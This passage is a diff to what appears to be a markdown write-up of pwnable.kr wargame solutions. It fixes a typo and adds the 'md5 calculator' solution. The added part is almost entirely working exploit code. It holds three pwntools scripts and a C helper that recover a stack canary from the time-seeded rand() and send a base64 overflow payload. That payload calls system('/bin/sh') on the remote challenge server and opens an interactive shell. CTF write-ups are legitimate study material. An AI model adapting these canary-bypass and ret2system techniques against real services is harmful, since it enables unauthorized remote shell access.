@@ -485,7 +485,7 @@ scanf will get content from terminal-input, and write the content to the address
 But, the scanf statement mistake to 
 
 ```c
-canf("%d",passcode1)
+scanf("%d",passcode1)
 ```
 
 It's means write content to the initial value of passcode1, So, the program doesn't work.
@@ -3144,6 +3144,179 @@ r.send(p32(gets_addr))
 r.send(p32(system_addr))
 r.sendline(b"/bin/sh")
 
+r.interactive()
+```
+
+### md5 calculator
+
+![image-20220821130913765](assets/image-20220821130913765.png)
+
+EXP: 
+
+canary.c needed
+
+execute in localhost
+
+```c
+#!/usr/bin/env python
+# coding=utf-8
+
+from pwn import *
+import time
+
+system_addr = 0x08049187
+gbuf_addr = 0x0804B0E0
+
+r = remote("localhost", 9002)
+# r = process("./hash")
+
+time_stamp = int(time.time())
+
+captcha = int(r.recvlines(2)[1].decode().split(": ")[1])
+
+p = process(executable="./canary", argv=["./canary", str(time_stamp), str(captcha)])
+canary = int(p.recvline().decode(), 16)
+
+r.sendline(str(captcha).encode())
+
+payload = b"k"*(512) + p32(canary) + b"k"*12 + p32(system_addr) + p32(gbuf_addr+1+716)
+b64e_payload = b64e(payload)
+
+r.sendlineafter(b"Encode your data with BASE64 then paste me!\n", b64e_payload + b"\x00"*1 + b"/bin/sh")
+
+r.interactive()
+```
+
+canary.c: 
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+/*
+Usage: ./[filename] [datestamp] [captcha]
+Author: K2V
+*/
+
+int main(int argc, char* argv[]){
+    if (argc<3){
+      printf("Usage: ./[filename] [datestamp] [captcha]\n");
+    }
+    int datestamp = atoi(argv[1]);
+    int captcha = atoi(argv[2]);
+    srand(datestamp);
+
+    int v2[8];
+    for(int i = 0; i <= 7; ++i ){
+        v2[i] = rand();
+    }
+    int canary = captcha -v2[4] + v2[6] - v2[7] - v2[2] + v2[3] - v2[1] - v2[5];
+    printf("%x\n", canary);
+    return 0;
+}
+```
+
+EXP2: 
+
+canary.c needed
+
+```python
+#!/usr/bin/env python
+# coding=utf-8
+
+from pwn import *
+import requests
+import time
+
+system_addr = 0x08049187
+gbuf_addr = 0x0804B0E0
+time_stamp = 0
+
+def get_date():
+    req = requests.get("http://pwnable.kr")
+    date = req.headers.get("date").split(", ")[1].split(" GMT")[0]
+
+    t_time = time.strptime(date, "%d %b %Y %H:%M:%S")
+    global time_stamp
+    time_stamp = int(time.mktime(t_time)) - 14400   # time on website later 4 hours with local time
+                                                    # becase there are diffent time zone
+
+r = remote("pwnable.kr", 9002)
+
+get_date()
+
+captcha = int(r.recvlines(2)[1].decode().split(": ")[1])
+
+p = process(executable="./canary", argv=["./canary", str(time_stamp), str(captcha)])
+canary = int(p.recvline().decode(), 16)
+
+r.sendline(str(captcha).encode())
+
+payload = b"k"*(512) + p32(canary) + b"k"*12 + p32(system_addr) + p32(gbuf_addr+1+716)
+b64e_payload = b64e(payload).encode()
+
+r.sendlineafter(b"Encode your data with BASE64 then paste me!\n", b64e_payload + b"\0" + b"/bin/sh")
+r.interactive()
+```
+
+EXP3: 
+
+Not canary.c needed
+
+```python
+#!/usr/bin/env python
+# coding=utf-8
+
+from pwn import *
+import requests
+import time
+import ctypes
+
+ll = ctypes.cdll.LoadLibrary
+lib = ll("libc.so.6")
+
+system_addr = 0x08049187
+gbuf_addr = 0x0804B0E0
+time_stamp = 0
+canary = 0
+rands = []
+
+def get_date():
+    req = requests.get("http://pwnable.kr")
+    date = req.headers.get("date").split(", ")[1].split(" GMT")[0]
+
+    t_time = time.strptime(date, "%d %b %Y %H:%M:%S")
+    global time_stamp
+    time_stamp = int(time.mktime(t_time)) - 14400   # time on website later 4 hours with localhost time
+                                                    # because there are different time zone
+
+def calc_canary(time_stamp, captcha):
+    lib.srand(time_stamp)
+    for i in range(8):
+        rands.append(lib.rand())
+
+    print(rands)
+    global canary
+    canary = captcha -rands[4] + rands[6] - rands[7] - rands[2] + rands[3] - rands[1] - rands[5]
+    canary &= 0xFFFFFFFF
+
+r = remote("pwnable.kr", 9002)
+
+get_date()
+
+captcha = int(r.recvlines(2)[1].decode().split(": ")[1])
+
+calc_canary(time_stamp, captcha)
+
+# p = process(executable="./canary", argv=["./canary", str(time_stamp), str(captcha)])
+# canary = int(p.recvline().decode(), 16)
+
+r.sendline(str(captcha).encode())
+
+payload = b"k"*(512) + p32(canary) + b"k"*12 + p32(system_addr) + p32(gbuf_addr+1+716)
+b64e_payload = b64e(payload).encode()
+
+r.sendlineafter(b"Encode your data with BASE64 then paste me!\n", b64e_payload + b"\0" + b"/bin/sh")
 r.interactive()
 ```
 
